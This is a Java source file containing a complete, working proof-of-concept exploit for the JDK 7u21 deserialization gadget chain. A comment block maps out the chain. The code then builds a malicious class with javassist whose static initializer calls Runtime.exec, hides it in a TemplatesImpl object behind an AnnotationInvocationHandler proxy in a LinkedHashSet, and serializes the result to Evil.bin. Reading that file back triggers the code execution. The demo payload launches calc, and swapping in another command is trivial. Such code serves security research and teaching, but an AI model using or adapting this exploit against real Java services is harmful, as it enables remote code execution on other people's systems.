package com.JDK;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javax.xml.transform.Templates;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.HashSet;
import java.util.LinkedHashSet;
import java.util.Map;


/**
 * Gadget chain :
 * LinkedHashSet.readObject()
 *   LinkedHashSet.add()
 *     ...
 *       TemplatesImpl.hashCode() (X)
 *   LinkedHashSet.add()
 *     ...
 *       Proxy(Templates).hashCode() (X)
 *         AnnotationInvocationHandler.invoke() (X)
 *           AnnotationInvocationHandler.hashCodeImpl() (X)
 *             String.hashCode() (0)
 *             AnnotationInvocationHandler.memberValueHashCode() (X)
 *               TemplatesImpl.hashCode() (X)
 *       Proxy(Templates).equals()
 *         AnnotationInvocationHandler.invoke()
 *           AnnotationInvocationHandler.equalsImpl()
 *             Method.invoke()
 *               ...
 *                  // TemplatesImpl.getOutputProperties()也可以
 *                   TemplatesImpl.newTransformer()
 *                     TemplatesImpl.getTransletInstance()
 *                       TemplatesImpl.defineTransletClasses()
 *                         ClassLoader.defineClass()
 *                         Class.newInstance()
 *                           ...
 *                             MaliciousClass.<clinit>()
 *                               ...
 *                                 Runtime.exec()
 *
 * 	Requires:
 * 	    JDK: jdk<=7u21
 *
 * 	Refer:
 *  https://github.com/fynch3r/Gadgets/blob/master/src/main/java/com/sec/exploits/jdk7u21/Exploit.java
 */


public class JDK7u21 {
    public static void main(String[] args) throws Exception{
        ClassPool pool = ClassPool.getDefault();
        CtClass payload = pool.makeClass("EvilClass");
        payload.setSuperclass(pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));
        payload.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc\");");
        byte[] classBytes = payload.toBytecode();
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_bytecodes", new byte[][]{classBytes});
        setFieldValue(templates, "_name", "JDK7u21");

        //整个map,容量为2
        Map map = new HashMap(2);
        String magicStr = "f5a5a608";
        // 占位
        map.put(magicStr, "foo");
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor cons = clazz.getDeclaredConstructor(Class.class,Map.class);
        cons.setAccessible(true);
        InvocationHandler invocationHandler = (InvocationHandler) cons.newInstance(Templates.class, map);
        Templates proxy = (Templates) Proxy.newProxyInstance(InvocationHandler.class.getClassLoader(), new Class[]{Templates.class}, invocationHandler);
        HashSet target = new LinkedHashSet();
        target.add(templates);
        target.add(proxy);
        //替换为真正的
        map.put(magicStr, templates);

        //payload序列化写入文件
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("Evil.bin"));
        outputStream.writeObject(target);
        outputStream.close();
        //服务端读取文件，反序列化，模拟网络传输
        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("Evil.bin"));
        inputStream.readObject();
    }

    public static void setFieldValue(Object object, String fieldName, Object value) throws Exception{
        Field field = object.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(object, value);
    }
}
